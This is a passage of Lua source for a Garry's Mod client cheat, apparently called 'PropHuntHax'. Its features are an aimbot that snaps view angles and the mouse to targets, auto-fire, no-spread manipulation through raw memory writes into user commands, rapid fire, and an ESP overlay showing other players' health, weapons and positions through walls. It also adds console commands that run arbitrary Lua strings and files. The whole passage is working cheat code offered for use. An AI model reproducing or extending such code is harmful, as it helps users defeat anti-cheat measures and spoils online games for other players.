			if v:IsValid() and phh_npcs:GetBool()
			and (v:IsNPC() or string.find(v:GetClass(), "npc_") or v:GetClass() == "omg_rpg_missile")
			and CheckNPCClass(v) and CheckVis(v) and CheckDistCheck(v, p())
			and v:GetMoveType() ~= 0 then
				if v2 and v2:IsValid() then
					if v:GetPos():Distance(p():GetShootPos())<v2:GetPos():Distance(p():GetShootPos()) then
						v2 = v
					end
				elseif v2 == nil then
					v2 = v
				end
			end
			--if v:GetClass() == "ph_prop" and CheckVis(v) then v2 = v end
		end
		if lastv2 == nil then lastv2 = v2 end
		local wep = p():GetActiveWeapon()
		if v2 and v2:IsValid() then
			if SNAP_AS and wep:IsValid() and 
			SNAP_WEAPONS[wep:GetClass()] and
			SNAP_WEAPONS[wep:GetClass()].bad and
			SNAP_WEAPONS[wep:GetClass()].bad(v2) then
				RCC("use", BestWep)
			end
			SNAP_TARGET = PropHuntTarget(v2)
			SNAP_AIMENT = v2
			SNAP_GO = true
			SNAP_FIRE = false
			if SNAP_AS then
				if wep and wep:IsValid() and SNAP_WEAPONS[wep:GetClass()] and SNAP_WEAPONS[wep:GetClass()].bad
				and SNAP_WEAPONS[wep:GetClass()].bad(v2) then
				RCC("use", BestWep)
				end
				if v2:IsPlayer() then
					SNAP_FIRE = v2:Health() < phh_cheap:GetFloat()
				else
					SNAP_FIRE = true
				end
				SNAP_JUSTHADENEMY = true
				SNAP_ACTIVITY = SNAP_RELOADTIME:GetFloat()
			end
			if v2:IsPlayer() then SNAPT = v2:Name() end
			if v2:IsNPC() or v2:GetClass() == "omg_rpg_missile" then SNAPT = v2:GetClass() end
		else
			if SNAP_AS then
				SNAP_FIRE = false
			end
			SNAPT = ""
		end
	else
		SNAPT = ""
		if SNAP_AS then
			SNAP_FIRE = false
		end
	end
	lastv2 = v2
	if (p():GetActiveWeapon():IsValid()) and not phh_DR:GetBool() then
		if SNAP_FIRE and (p():GetActiveWeapon():Clip1() == 0) then
			local BestWep = GetBestWeapon(nil, true)
			if BestWep and BestWep:IsValid() and wep():IsValid() and BestWep ~= wep() then
				WEAPON_SELECT = BestWep
			else
				print(p():GetActiveWeapon():Clip1())
				reloadTimer()
			end
		end
	end
	if p():GetNetworkedInt("blind") == 1 then
		p():SetNetworkedInt("blind",0)
	end
	blind = false
	if phh_jump:GetFloat() ~= 0 and SNAP_JUMP ~= 2 then
		local trace = {}
		trace.start = p():GetShootPos()+Angle(0,0,p():EyeAngles().y):Forward()*phh_jump:GetFloat()
		trace.endpos = trace.start-Vector(0,0,85)
		local trResult = util.TraceLine(trace)
		if not trResult.Hit then
			SNAP_JUMP = true
		end
	end
end
SNAP_KEYS = {}
SNAP_NOKEYS = false
table.insert(SNAP_KEYS, {30, false, "SNAP = !SNAP"})
table.insert(SNAP_KEYS, {17, false, "SNAP_HUD = !SNAP_HUD"})
table.insert(SNAP_KEYS, {18, false, "SNAP_AS = !SNAP_AS"})
table.insert(SNAP_KEYS, {20, false, "CamEnable()"})
table.insert(SNAP_KEYS, {21, false, "CamDisable()"})
--hook.Add("StartChat", "!", function() SNAP_NOKEYS = true end)
--hook.Add("FinishChat", "!", function() SNAP_NOKEYS = false end)
function PropHuntSnap()
	if phh_keys:GetBool() then
		for k,v in pairs(SNAP_KEYS) do
			if (!SNAP_NOKEYS) and input.IsKeyDown(v[1]) and not v[2] then
				RunString(v[3])
				v[2] = true
			elseif v[2] and not input.IsKeyDown(v[1]) then
				v[2] = false
			end
		end
	end
	--[[
	local KeyEvents = {}
	for i=1, 130 do
       if( input.IsKeyDown(i)  && !KeyEvents[i] ) then // The key has been pressed
           KeyEvents[i] = true
           LocalPlayer():ChatPrint("You pressed key "..i)
       elseif( !input.IsKeyDown(i) && KeyEvents[i] ) then // The key has been released
           KeyEvents[i] = false
       end
    end
	--]]
	AllThatStuff()
	local ang = (SNAP_TARGET-p():GetShootPos()):Angle()
	if table.HasValue(string.Explode(",", phh_mode:GetString()), "1") then
		if SNAP_GO then p():SetEyeAngles(ang) end
	end
	if table.HasValue(string.Explode(",", phh_mode:GetString()), "3") then
		if SNAP_GO then
			local vec = SNAP_TARGET:ToScreen()
			gui.SetMousePos(vec.x, vec.y)
		end
	end
end hook.Add("Think","!!!",PropHuntSnap)
function PropHuntHurt(ply, attacker, htl, dmg)
	Msg(tostring(attacker:GetName()).." dealt "..dmg.." damage to "..ply:GetName()..".\n")
end hook.Add("PlayerHurt","PropHuntHurt",PropHuntHurt)
phh_walk	=	CreateClientConVar(	"phh_walk",				"",		true,	false)
require"memory"
require"deco"
local GJailCones = {
	weapon_famas_rifle	=	.025	,
	weapon_aug_rifle	=	.01		,
	weapon_m4a1_rifle	=	.02		,
	weapon_prisoner_gun	=	.02		,
	weapon_deagle_gun	=	.03		,
}
local override_spreads = {
	weapon_ar2 = 0.02618,
	weapon_shotgun = 0.08716,
	weapon_smg1 = 0.04362,
	weapon_zs_zombie = 0,
	weapon_zs_fastzombie = 0,
}
function GetFalloutCone(wep, cone, wepent)
	if override_spreads[wepent:GetClass()] then
		return override_spreads[wepent:GetClass()]
	elseif wep and wep.Author == "Meoowe" then
		return GJailCones[wep.ClassName]
	elseif Skills and wep and wep.Primary then
		CL = LocalPlayer()
		local LastShootTime = wep.Weapon:GetNetworkedFloat( "LastShootTime", 0 ) 
		local lastshootmod = math.Clamp(wep.LastFireMax + 1 - math.Clamp( (CurTime() - LastShootTime) * wep.LastFireModifier, 0.0, wep.LastFireMax ), 1.0,wep.LastFireMaxMod) 
		local accuracy = wep.Primary.Accuracy
		if CL:IsMoving() then accuracy = accuracy * wep.MoveModifier end
		if wep.Weapon:GetNetworkedBool( "Ironsights", false ) then accuracy = accuracy * 0.75 end
		accuracy = accuracy * ((16-Skills.Marksman)/11)
		if CL:KeyDown(IN_DUCK) then
			return accuracy*wep.CrouchModifier*lastshootmod
		else
			return accuracy*lastshootmod
		end
	end
end
local walk_pulse = false
local previous_ang = nil
local current_seed = 0
local RAPID_FIRE
require"command"
local RCC = RunConsoleCommand
concommand.Add("+rapidfire", function(p,c,a)
	RAPID_FIRE = true
	RCC"+attack"
end)
concommand.Add("-rapidfire", function(p,c,a)
	RAPID_FIRE = false
	RCC"-attack"
end)
-- So stolen from ASB.
local prediction = {
	weapon_pistol = 40000,
	weapon_357 = 20500,
	weapon_smg = 39000,
	weapon_ar2 = 39000,
	weapon_shotgun = 35000,
	weapon_crossbow = 3485,
	weapon_rpg = 0
}
SNAP_RELOAD_DONE = false
function PropHuntWalk(UCMD)
	local ccc = false
	if phh_flashspam:GetBool() then
		RCC("impulse", "100")
	end
	if phh_spaz:GetBool() then
		UCMD:SetViewAngles(VectorRand():Angle())
		--UCMD:SetForwardMove(math.random(-1000, 1000))
		--UCMD:SetSideMove(math.random(-1000, 1000))
		--UCMD:SetUpMove(math.random(-1000, 1000))
	end
	if phh_walk:GetFloat() ~= 0 and not p():KeyDown(IN_SPEED) then
		UCMD:SetForwardMove(math.min(phh_walk:GetFloat(), UCMD:GetForwardMove()))
		UCMD:SetSideMove(math.min(phh_walk:GetFloat(), UCMD:GetSideMove()))
		UCMD:SetUpMove(math.min(phh_walk:GetFloat(), UCMD:GetUpMove()))
	end
	local b = memory.GetInteger(UCMD, 36, 1337)
	if SNAP_AS and (not p():KeyDown(IN_ATTACK)) then
		if SNAP_ACTIVITY < 0.1 then
			if SNAP_RELOAD_DONE then
				SNAP_RELOAD_DONE = true
				reloadTimer()
			end
		else
			SNAP_RELOAD_DONE = false
		end
	end
	if SNAP_AS and (SNAP_FIRE or RAPID_FIRE) then
		memory.SetInteger(UCMD, 36, b+((b%2 == 0 and not walk_pulse) and 1 or 0))
		b = b+1
		walk_pulse = not walk_pulse
		SNAP_ACTIVITY = SNAP_RELOADTIME:GetFloat()
	end
	local ang = LocalPlayer():GetAimVector():Angle()
	if table.HasValue(string.Explode(",", phh_mode:GetString()), "2") and SNAP_AIMENT and SNAP_AIMENT:IsValid() then
		--local ang = (SNAP_TARGET-p():GetShootPos()):Angle()
		if SNAP_GO then
			local tpos = PropHuntTarget(SNAP_AIMENT)
			local vector = tpos-p():GetShootPos()
			local position, weapon = p():GetPos(), p():GetActiveWeapon()
			local speed, distance = p():GetVelocity():Length(), vector:Length()
			
			local pp, t = Vector(0, 0, 0), Vector(0, 0, 0)
			if distance < 4000 and speed > 0 then pp = p():GetVelocity() * distance / (speed * distance * 0.125) end
			--if weapon:IsWeapon() and prediction[weapon:GetClass()] ~= 0 then t = SNAP_AIMENT:GetVelocity() * distance / (prediction[weapon:GetClass()] or math.huge)end--150000) end
			vector = vector - pp + t
			ang = vector:Angle()
			previous_ang = ang
			if memory then
				memory.SetVector(UCMD, 8, Vector(0, ang.p, ang.y))
				--UCMD:SetViewAngles(ang)
			else
				UCMD:SetViewAngles(ang)
			end
			ccc = true
		end
	end
	if b%2 ~= 0 and phh_nospread:GetBool() and not RAPID_FIRE then
		local cmd, seed = hl2_ucmd_getprediciton(UCMD)
		if cmd ~= 0 then
			currentseed = seed
		end
		previous_ang = previous_ang or ang
		local wep = LocalPlayer():GetActiveWeapon()
		local cone
		if wep and wep:IsValid() then
			cone = -(tonumber(GetWepVal(wep:GetTable(), "Cone")) or tonumber(GetWepVal(wep:GetTable(), "Spread")) or GetFalloutCone(wep:GetTable(), nil, wep) or 0)
		else
			cone = 0
		end
		--print(cone)
		if cone ~= 0 then
			local ang = hl2_shotmanip(currentseed or 0, previous_ang:Forward(), Vector(cone, cone, cone)):Angle()
			if memory then
				memory.SetVector(UCMD, 8, Vector(0, ang.p, ang.y))
			else
				UCMD:SetViewAngles(ang)
			end
			ccc = true
		end
	elseif previous_ang then
		local ang = previous_ang
		if memory.GetInteger(UCMD, 56, 1337) == 0 then
			if memory then
				memory.SetVector(UCMD, 8, Vector(0, ang.p, ang.y))
			else
				UCMD:SetViewAngles(ang)
			end
		end
		previous_ang = nil
		ccc = true
	end
	if WEAPON_SELECT then
		memory.SetInteger(UCMD, 44, WEAPON_SELECT:EntIndex())
		WEAPON_SELECT = nil
	elseif phh_weaponspam:GetBool() then
		local wep = LocalPlayer():GetWeapons()[math.random(#LocalPlayer():GetWeapons())]
		if wep then
			memory.SetInteger(UCMD, 44, wep:EntIndex())
		end
	end
	if ccc then
		UCMD:SetMouseX(1)
		UCMD:SetMouseY(1)
	end
end	hook.Add("CreateMove", "!", PropHuntWalk)
SNAP_MOVING = 0
SNAP_CROUCHING = false
function PropHuntMove(cmd)
	SNAP_MOVING = cmd:GetVelocity():Length()/cmd:GetMaxSpeed()
	SNAP_CROUCHING = p():KeyDown(IN_DUCK)
end hook.Add("Move", "!", PropHuntMove)
function PropHuntView()
	local rettab = {}
	if SNAP_FOV ~= SNAP_DEFFOV then
		rettab.fov = SNAP_FOV
	end
	if table.HasValue(string.Explode(",", phh_mode:GetString()), "4") then
		local ang = (SNAP_TARGET-p():GetShootPos()):Angle()
		if SNAP_GO then
			rettab.angles = ang
		end
	end
	if rettab.fov or rettab.ang then
		return rettab
	end
end	hook.Add("CalcView", "!", PropHuntView)
local l_fov_s = 0
require"command"
function PropHuntAdjustMouseSensitivity()
	if SNAP_FOV/90 ~= l_fov_s then
		command.ServerCommand("sensitivity "..SNAP_FOV/9*1.2 .."\n")
		l_fov_s = SNAP_FOV/90
	end
	return SNAP_FOV/90
end	hook.Add("AdjustMouseSensitivity", "!", PropHuntAdjustMouseSensitivity)

function PropHuntSnapOnCC()
	if not phh_keys:GetBool() then
		SNAP = !SNAP
	end
end concommand.Add("phh_snap",PropHuntSnapOnCC)
SNAP_PADJ = 0
function PropHuntPerfectOnCC()
	SNAP_PERFECT = !SNAP_PERFECT
	if SNAP_PERFECT then
		SNAP_ADJUST = true
		SNAP_PADJ = CurTime()
		gui.EnableScreenClicker(true)
	end
end concommand.Add("+phh_perfect",PropHuntPerfectOnCC)
function PropHuntPerfectOnCC()
	SNAP_ADJUST = false
	gui.EnableScreenClicker(false)
end concommand.Add("-phh_perfect",PropHuntPerfectOnCC)

function PropHuntSnapOnASCC()
	if not phh_keys:GetBool() then
		SNAP_AS = !SNAP_AS
		if not SNAP_AS then
			RCC("-attack")
		end
	end
end concommand.Add("phh_snapas",PropHuntSnapOnASCC)

function PropHuntZoomOnCC()
	SNAP_FOVT = true
end concommand.Add("+phh_zoom",PropHuntZoomOnCC)

function PropHuntZoomOffCC()
	SNAP_FOVT = false
end concommand.Add("-phh_zoom",PropHuntZoomOffCC)

--[[function PropHuntSnapOnCC()
	SNAPM = false
end concommand.Add("-phh_snapmenu",PropHuntSnapOnCC)

function PropHuntSnapOnCC()
	SNAPM = true
end concommand.Add("+phh_snapmenu",PropHuntSnapOnCC)

function PropHuntSnapOnCC()
	SNAPINT = !SNAPINT
end concommand.Add("phh_snapint",PropHuntSnapOnCC)
]]
SNAP_CLENT = nil
function PropHuntHUDOnCC()
	if not phh_keys:GetBool() then
		SNAP_HUD = !SNAP_HUD
	end
	if not (SNAP_CLENT and SNAP_CLENT:IsValid()) then
		SNAP_CLENT = ClientsideModel("models/Combine_Helicopter/helicopter_bomb01.mdl",RENDERGROUP_OPAQUE)
	end
	for k,v in pairs(p():GetWeapons()) do
		if v and v:IsValid() then
			tab = v:GetTable() or {}
			function tab:ViewModelDrawn()
				hook.Call('DrawClientStuff', nil, self)
			end
		end
	end
end concommand.Add("phh_hud",PropHuntHUDOnCC)

function AseLuaCC(ply,cmd,args)
	local endval = ""
	for k,v in pairs(args) do
		endval = endval..tostring(v)
	end
	GP = p()
	GS = SNAP
	GL = ents.FindByClass("player")
	GK = ents.FindByClass("ph_prop")
	GC = CurTime()
	GH = pairs
	GT = p():Team()
	RunString(table.concat(args, ""))
	GP, GS, GL, GK, GC, GH, GT = nil,nil,nil,nil,nil,nil,nil
end concommand.Add("lua",AseLuaCC)

function AseOpenCC(ply,cmd,args)
	local endval = ""
	for k,v in pairs(args) do
		endval = endval..tostring(v)
	end
	GP = p()
	GS = SNAP
	GL = ents.FindByClass("player")
	GK = ents.FindByClass("ph_prop")
	GC = CurTime()
	GH = pairs
	GT = p():Team()
	RunString(file.Read(endval))
	GP, GS, GL, GK, GC, GH, GT = nil,nil,nil,nil,nil,nil,nil
end concommand.Add("my_open",AseOpenCC)

ACAM_ANGLES = Angle(0,0,0)

function DrawFancyBox(x, y, incol, outcol, dist, vis)
	surface.SetDrawColor(incol.r, incol.g, incol.b, incol.a)
	bmm = 4
	surface.DrawRect(x-bmm, y-bmm, bmm*2, bmm*2)
	surface.SetDrawColor(outcol.r, outcol.g, outcol.b, outcol.a)
	bmm = math.Clamp(dist, 0.5, 5)
	surface.DrawOutlinedRect(x-bmm-2, y-bmm-2, bmm*2+4, bmm*2+4)
	surface.DrawOutlinedRect(x-bmm, y-bmm, bmm*2, bmm*2)
	if vec and vec ~= Vector(0,0,0) then
		if vis then
			bmm = 6-bmm
			surface.SetDrawColor(255-outcol.r, 255-outcol.g, 255-outcol.b, 255)
			surface.DrawLine(x-3, y, x-2-bmm*3, y)
			surface.DrawLine(x+3, y, x+2+bmm*3, y)
			surface.DrawLine(x, y-3, x, y-3-bmm*3)
			surface.DrawLine(x, y+3, x, y+3+bmm*3)
			surface.SetDrawColor(outcol.r, outcol.g, outcol.b, outcol.a)
		end
	end
end
SNAP_TEXTS = {}
function DrawFancyText(name, text, x, y)
	if SNAP_TEXTS[name] then
		if SNAP_TEXTS[name].text == text and SNAP_TEXTS[name].im then
			im = SNAP_TEXTS[name].im
		else
			SNAP_TEXTS[name].im = markup.Parse(text)
			SNAP_TEXTS[name].text = text
			im = SNAP_TEXTS[name].im
		end
	else
		SNAP_TEXTS[name] = {}
		SNAP_TEXTS[name].text = text
		SNAP_TEXTS[name].im = markup.Parse(text)
		im = SNAP_TEXTS[name].im
	end
	im:Draw(x, y, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
end
local Laser = Material("cable/redlaser")
function PropHuntDraw(ent)
	if not SNAP_HUD then return end
	local tr = SNAP_FRAMETRACE -- lazehness
	if not (tr and tr.HitPos) then return end
	local data = GetWeaponInfo(wep())
	if SNAP_CROUCHING then
		cone = tonumber(data.ConeCrouching) or tonumber(data.Cone) or 0
	else
		local c = tonumber(data.Cone) or 0
		local m = tonumber(data.ConeMoving) or tonumber(data.Cone) or 0
		cone = c+(m-c)*SNAP_MOVING
	end
	local shoot_pos = p():GetShootPos()
	local dist = tr.HitPos:Distance(shoot_pos)
	local TargetAngle 	= tr.HitNormal:Angle()
		TargetAngle:RotateAroundAxis( TargetAngle:Forward(), 90 )
		TargetAngle:RotateAroundAxis( TargetAngle:Right(), -90 )
	cam.IgnoreZ(true)
	local Ones = {}
	if type(cone) == "number" then
		Ones[#Ones+1] = {dist*math.tan(cone), Color(0, 255, 0, 30)}
	end
	if SNAP_PERFECT then
		Ones[#Ones+1] = {dist*math.acos(SNAP_PCONE or 0), Color(255, 0, 0, 30)}
	end
	cam.Start3D2D(tr.HitPos+tr.HitNormal, TargetAngle, 1)
		table.sort(Ones, function(a, b) return a[1]>b[1] end)
		for i = 1,#Ones do
			v = Ones[i]
			local size = v[1]
			draw.RoundedBox(size, -size, -size, size*2, size*2, v[2])
		end
	cam.End3D2D()
	-- LAZORZ
	render.SetMaterial(Laser)
	render.DrawBeam(tr.HitPos, tr.HitPos+tr.HitNormal*(dist/50+10), dist/100+5, 0, 0, Color( 255, 255, 255, 255 ) )
	local pcm, dist, bx, by, bmm, col hl, wn = 0,0,0,0,0,nil,""
	local place, boney, v, data
	for k,it in pairs(SNAP_HUDENTS) do
		if not SNAP_HUDDETECTED then break end
		v = it[1]
		data = it[2]
		if v and v:IsValid() then
			done = false
			place = PropHuntTarget(v)
			dist = math.floor(math.abs((place-p():GetPos()):Length())/10)
			local TargetAngle 	= (shoot_pos-place):Angle()
				TargetAngle:RotateAroundAxis( TargetAngle:Forward(), 90 )
				TargetAngle:RotateAroundAxis( TargetAngle:Right(), -90 )
			cam.IgnoreZ(true)
			cam.Start3D2D(place, TargetAngle, 1)
			cam.IgnoreZ(true)
			pcm = {x = 0, y = 0, visible = true}
			if v:IsPlayer() and v ~= p() then
				if v:Alive() then
					col = Color(255-math.Clamp(v:Health(), 0, 100)*2.55,
								math.Clamp(v:Health(), 0, 100)*2.55,
								0, 255-math.Clamp(dist,100,170))
				else
					col = Color(0, 0, 0, 255-math.Clamp(dist,100,170))
				end
				DrawFancyBox(
					pcm.x,
					pcm.y,
					col,
					team.GetColor(v:Team()),
					dist,
					pcm.visible
				)
				if v:Alive() then
					hl = v:Health()
				else
					hl = "DEAD"
				end
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..data.team..": "..data.name.."\n"..
					"<color=red>"..hl.."</color>: "..dist.."\n"..
					data.weapon.."("..data.clip.."/"..data.ammo..")</color>\n",
					pcm.x, pcm.y+7
				)
			elseif phh_npcs:GetBool() and (v:IsNPC() or string.find(v:GetClass(), "npc_") or v:GetClass() == "omg_rpg_missile") then
				DrawFancyBox(
					pcm.x,
					pcm.y,
					Color(255-math.Clamp(v:GetMoveType(), 0, 1)*255, math.Clamp(v:GetMoveType(), 0, 1)*255,
					0, 255-math.Clamp(dist,100,170)),
					ColorHash(v:GetClass()),
					dist,
					pcm.visible
				)
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..v:GetClass().."</color>\n"..
					"<color=red>MoveType:</color> <color=white>"..v:GetMoveType().."</color>\n"..
					"<color=red>Dist:</color> <color=white>"..dist.."</color>\n",
					pcm.x, pcm.y+7
				)
			elseif v:IsWeapon() and !v:IsCarriedByLocalPlayer() and phh_weapons:GetString() == "2" then
				DrawFancyBox(
					pcm.x,
					pcm.y,
					Color(0, 0, 255,  255-math.Clamp(dist,100,170)),
					ColorHash(v:GetPrintName() or v:GetClass()),
					dist,
					pcm.visible
				)
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..v:GetPrintName().."</color>\n"..
					"<color=red>Dist:</color> <color=white>"..dist.."</color>\n",
					pcm.x, pcm.y+7
				)
			elseif v:IsWeapon() and v:IsCarriedByLocalPlayer() then
			elseif CheckHUDCheck(v:GetClass()) then
				DrawFancyBox(
					pcm.x,
					pcm.y,
					Color(255, 0, 255,  255-math.Clamp(dist,100,170)),
					ColorHash(v:GetClass()),
					dist,
					pcm.visible
				)
				local own = ""
				if v:GetOwner() and v:GetOwner():IsPlayer() and v:GetOwner():IsValid() and getmetatable(v:GetOwner()).Name then
					own = "<color=red>Owner:</color> <color=white>"..v:GetOwner():Name().."</color>\n"
				end
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..v:GetClass().."</color>\n"..own..
					"<color=red>Dist:</color> <color=white>"..dist.."</color>\n",
					pcm.x, pcm.y+7
				)
				done = true
			end
		cam.End3D2D()
		end
	end
end hook.Add("DrawClientStuff", "!", PropHuntDraw)
function PropHuntHUD()
	surface.SetFont("PropHuntHax")
	if SNAPM then
		return
	end
	draw.RoundedBox(16, ScrW()/2-150, ScrH()-120, 300, 100, Color(70, 70, 255, 100))
	if SNAP then
		surface.SetTextPos(ScrW()/2-140, ScrH()-110)
		surface.SetTextColor(255,255,0,255)
		surface.DrawText("SNAP ON")
	end
	surface.SetTextPos(ScrW()/2-140, ScrH()-50)
	surface.SetTextColor(255,255,0,255)
	surface.DrawText("NAME: "..(phh_Test:GetString() or "*NONE*"))
	surface.SetTextPos(ScrW()/2, ScrH()-50)
	surface.DrawText("TEAM: "..(phh_Team:GetString() or "*ALL TEAMS*"))
	if phh_Vis:GetString() == "1" then
		surface.SetTextPos(ScrW()/2, ScrH()-90)
		surface.SetTextColor(255,255,0,255)
		surface.DrawText("VISIBLE ONLY")
	end
	if SNAP_AS then
		surface.SetTextPos(ScrW()/2-140, ScrH()-90)
		surface.SetTextColor(255,255,0,255)
		surface.DrawText("AUTOSHOOT ON")
	end
	surface.SetTextPos(ScrW()/2-140, ScrH()-70)
	surface.DrawText("ACTIVITY: "..(math.floor(SNAP_ACTIVITY*10)/10))
	if SNAP_PERFECT then
		surface.SetTextPos(ScrW()/2, ScrH()-110)
		surface.SetTextColor(255,255,0,255)
		surface.DrawText("PERFECT ON")
	end
	local curcol = Color(0, 255, 0, 255)
	if SNAPT and SNAPT ~= "" then
		surface.SetTextPos(ScrW()/2-10, ScrH()/2-100)
		surface.SetTextColor(255,255,0,255)
		surface.DrawText(SNAPT)
		curcol = Color(255, 0, 0, 255)
	end
	if not SNAP_HUD then return end
	draw.RoundedBox(16, ScrW()/2-360, ScrH()-120, 200, 100, Color(70, 70, 255, 100))
	surface.SetTextColor(255,255,0,255)
	surface.SetTextPos(ScrW()/2-350, ScrH()-110)
	local w = wep()
	local WepData = GetWeaponInfo(w)
	surface.DrawText(WepData.wname.." ("..WepData.Class..")")
	surface.SetTextPos(ScrW()/2-350, ScrH()-90)
	surface.DrawText("Damage: "..WepData.Damage)
	surface.SetTextPos(ScrW()/2-250, ScrH()-90)
	surface.DrawText("Cone: "..WepData.Cone)
	surface.SetTextPos(ScrW()/2-350, ScrH()-70)
	surface.DrawText("Delay: "..WepData.Delay)
	surface.SetTextPos(ScrW()/2-250, ScrH()-70)
	surface.DrawText("Rating: "..WepData.Rating)
	surface.SetTextPos(ScrW()/2-350, ScrH()-50)
	surface.DrawText("Clip: "..WepData.Clip.." of "..WepData.MaxClip)
	surface.SetTextPos(ScrW()/2-250, ScrH()-50)
	surface.DrawText("NumShots: "..WepData.NumShots)
	--[[if w and w:IsValid() then
		local cone = nil
		cone = w:GetTable().Cone
		if not cone then
			if w:GetTable().Primary then
				cone = w:GetTable().Primary.Cone
			end
		end
		if cone then
			local tr = SNAP_FRAMETRACE -- lazehness
			local size = tr.HitPos:Distance(p():GetShootPos())*math.tan(cone)
			local tr = SNAP_FRAMETRACE -- lazehness
			local size = tr.HitPos:Distance(p():GetShootPos())*math.tan(cone)
			draw.RoundedBox(size, ScrW()/2-size, ScrH()/2-size, size*2, size*2, Color(0, 0, 0, 50))
		end
	end]]
	surface.SetDrawColor(curcol.r, curcol.g, curcol.b, curcol.a)
	surface.DrawLine(ScrW()/2-10, ScrH()/2, ScrW()/2-20, ScrH()/2)
	surface.DrawLine(ScrW()/2+10, ScrH()/2, ScrW()/2+20, ScrH()/2)
	surface.DrawLine(ScrW()/2, ScrH()/2-10, ScrW()/2, ScrH()/2-20)
	surface.DrawLine(ScrW()/2, ScrH()/2+10, ScrW()/2, ScrH()/2+20)
	draw.RoundedBox(0, (ScrW()/2)-1, (ScrH()/2)-1, 2, 2, curcol)
	local ph_props		= ents.GetAll()
	local pcm, dist, bx, by, bmm, col hl, wn = 0,0,0,0,0,nil,""
	local place, boney, v, data
	for k,it in pairs(SNAP_HUDENTS) do
		if SNAP_HUDDETECTED then break end
		v = it[1]
		data = it[2]
		if v and v:IsValid() then
			done = false
			place = PropHuntTarget(v)
			dist = math.floor(math.abs((place-p():GetPos()):Length())/10)
			pcm = VecToScreen(place or Vector(0,0,0))
			pcm.visible = v.Visible
			if pcm.x < 0 or pcm.x > ScrW() or pcm.y < 0 or pcm.y > ScrH() then
				--FAIL
			elseif v:IsPlayer() and v ~= p() then
				if v:Alive() then
					col = Color(255-math.Clamp(v:Health(), 0, 100)*2.55,
								math.Clamp(v:Health(), 0, 100)*2.55,
								0, 255-math.Clamp(dist,100,170))
				else
					col = Color(0, 0, 0, 255-math.Clamp(dist,100,170))
				end
				DrawFancyBox(
					pcm.x,
					pcm.y,
					col,
					team.GetColor(v:Team()),
					dist,
					pcm.visible
				)
				if v:Alive() then
					hl = v:Health()
				else
					hl = "DEAD"
				end
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..data.team..": "..data.name.."\n"..
					"<color=red>"..hl.."</color>: "..dist.."\n"..
					data.weapon.."("..data.clip.."/"..data.ammo..")</color>\n",
					pcm.x, pcm.y+7
				)
				local eyepos = (place+v:GetAimVector()*20):ToScreen()
				local tcol = team.GetColor(v:Team())
				surface.SetDrawColor(tcol.r, tcol.g, tcol.b, tcol.a)
				surface.DrawLine(eyepos.x, eyepos.y, pcm.x, pcm.y)
				local eyepos = v:GetPos():ToScreen()
				surface.DrawLine(eyepos.x, eyepos.y, pcm.x, pcm.y)
			elseif phh_npcs:GetBool() and (v:IsNPC() or string.find(v:GetClass(), "npc_") or v:GetClass() == "omg_rpg_missile") then
				DrawFancyBox(
					pcm.x,
					pcm.y,
					Color(255-math.Clamp(v:GetMoveType(), 0, 1)*255, math.Clamp(v:GetMoveType(), 0, 1)*255,
					0, 255-math.Clamp(dist,100,170)),
					ColorHash(v:GetClass()),
					dist,
					pcm.visible
				)
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..v:GetClass().."</color>\n"..
					"<color=red>MoveType:</color> <color=white>"..v:GetMoveType().."</color>\n"..
					"<color=red>Dist:</color> <color=white>"..dist.."</color>\n",
					pcm.x, pcm.y+7
				)
			elseif v:IsWeapon() and !v:IsCarriedByLocalPlayer() and phh_weapons:GetString() == "2" then
				DrawFancyBox(
					pcm.x,
					pcm.y,
					Color(0, 0, 255,  255-math.Clamp(dist,100,170)),
					ColorHash(v:GetPrintName() or v:GetClass()),
					dist,
					pcm.visible
				)
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..v:GetPrintName().."</color>\n"..
					"<color=red>Dist:</color> <color=white>"..dist.."</color>\n",
					pcm.x, pcm.y+7
				)
			elseif v:IsWeapon() and v:IsCarriedByLocalPlayer() then
			elseif CheckHUDCheck(v:GetClass()) then
				DrawFancyBox(
					pcm.x,
					pcm.y,
					Color(255, 0, 255,  255-math.Clamp(dist,100,170)),
					ColorHash(v:GetClass()),
					dist,
					pcm.visible
				)
				local own = ""
				if v:GetOwner() and v:GetOwner():IsPlayer() and v:GetOwner():IsValid() and getmetatable(v:GetOwner()).Name then
					own = "<color=red>Owner:</color> <color=white>"..v:GetOwner():Name().."</color>\n"
				end
				DrawFancyText(v:EntIndex(),"<font=PropHuntHax>"..
					"<color=white>"..v:GetClass().."</color>\n"..own..
					"<color=red>Dist:</color> <color=white>"..dist.."</color>\n",
					pcm.x, pcm.y+7
				)
				done = true
			end
		end
	end
	local col
	if CheckHUDCheck("spawns") then
		for k,v in pairs(SNAP_SPAWNS) do
			dist = math.floor(math.abs((v[2]-p():GetPos()):Length())/10)
			local pcm = v[2]:ToScreen()
			local x, y = pcm.x, pcm.y
			col = team.GetColor(v[1])
			if v[1] == -9999 then col = Color(255, 0, 0, 255) end
			surface.SetDrawColor(col.r, col.g, col.b, col.a)
			bmm = math.Clamp(dist, 0.5, 5)
			surface.DrawOutlinedRect(x-bmm, y-bmm, bmm*2, bmm*2)
			surface.DrawLine(x+bmm/2, y, x+bmm*2, y)
			surface.DrawLine(x-bmm/2, y, x-bmm*2, y)
			surface.DrawLine(x, y+bmm/2, x, y+bmm*2)
			surface.DrawLine(x, y-bmm/2, x, y-bmm*2)
		end
	end
	if CheckHUDCheck("secrets") then
		for k,v in pairs(SNAP_SPECMAP[CurMap()] or {}) do
			dist = math.floor(math.abs((v-p():GetPos()):Length())/10)
			local pcm = v:ToScreen()
			local x, y = pcm.x, pcm.y
			 col = Color(255, 0, 0, 255)
			surface.SetDrawColor(col.r, col.g, col.b, col.a)
			bmm = math.Clamp(dist, 0.5, 5)
			surface.DrawOutlinedRect(x-bmm, y-bmm, bmm*2, bmm*2)
			surface.DrawLine(x+bmm/2, y, x+bmm*2, y)
			surface.DrawLine(x-bmm/2, y, x-bmm*2, y)
			surface.DrawLine(x, y+bmm/2, x, y+bmm*2)
			surface.DrawLine(x, y-bmm/2, x, y-bmm*2)
		end
	end
